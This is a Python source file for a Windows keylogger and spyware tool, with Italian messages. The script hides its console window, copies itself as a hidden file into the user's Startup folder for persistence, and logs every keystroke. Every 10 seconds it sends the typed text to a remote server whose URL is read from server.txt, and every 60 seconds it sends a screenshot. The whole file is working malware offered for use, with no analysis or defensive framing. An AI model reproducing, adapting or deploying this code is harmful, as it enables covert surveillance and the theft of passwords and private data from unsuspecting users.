import win32gui
import win32console
from pynput import keyboard
import requests
import json
import threading
import pyautogui
import os
import io
import ctypes
import sys
import shutil
import subprocess
import time 

FILE_ATTRIBUTE_HIDDEN = 0x02

def Hide():
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

Hide()

try:
    with open("server.txt", "r") as f:
        public_url = f.read().strip()
except FileNotFoundError:
    sys.exit()

def copia_in_startup_e_rilancia():
    startup_dir = os.path.join(
        os.environ["APPDATA"],
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )
    exe_name = os.path.basename(sys.argv[0])
    startup_path = os.path.join(startup_dir, exe_name)

    shutil.copy2("server.txt", startup_dir)
    ctypes.windll.kernel32.SetFileAttributesW(startup_path, FILE_ATTRIBUTE_HIDDEN)

    if sys.argv[0] != startup_path:
        shutil.copy2(sys.argv[0], startup_path)
        ctypes.windll.kernel32.SetFileAttributesW(startup_path, FILE_ATTRIBUTE_HIDDEN)
        subprocess.Popen([startup_path])
        sys.exit()

copia_in_startup_e_rilancia()

text = ""
time_interval = 10
screenshot_interval = 60

def capture_and_send_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        buf = io.BytesIO()
        screenshot.save(buf, format="PNG")
        buf.seek(0)
        response = requests.post(
            f"{public_url}/screenshot",
            files={"file": ("screenshot.png", buf, "image/png")}
        )
        print("Screenshot inviato:", response.status_code)
    except Exception as e:
        print("Errore invio screenshot:", e)

def schedule_screenshot():
    while True:
        capture_and_send_screenshot()
        time.sleep(screenshot_interval)

def send_post_req():
    global text
    while True:
        try:
            payload = json.dumps({"KBdatas": text})
            response = requests.post(f"{public_url}/", data=payload, headers={"Content-Type": "application/json"})
            print("Testo inviato:", response.status_code)
            text = ""
        except Exception as e:
            print("Errore invio testo:", e)
        time.sleep(time_interval)

def on_press(key):
    global text
    try:
        if hasattr(key, 'char') and key.char is not None:
            text += key.char
        else:
            if key == keyboard.Key.enter:
                text += "[ENTER]\n"
            elif key == keyboard.Key.tab:
                text += "[TAB] "
            elif key == keyboard.Key.space:
                text += " "
            elif key == keyboard.Key.backspace:
                text = text[:-1] if text else text
            elif key == keyboard.Key.esc:
                text += "[ESC] "
            else:
                text += f"[{key.name}]"
    except Exception:
        pass

threading.Thread(target=send_post_req, daemon=True).start()
threading.Thread(target=schedule_screenshot, daemon=True).start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

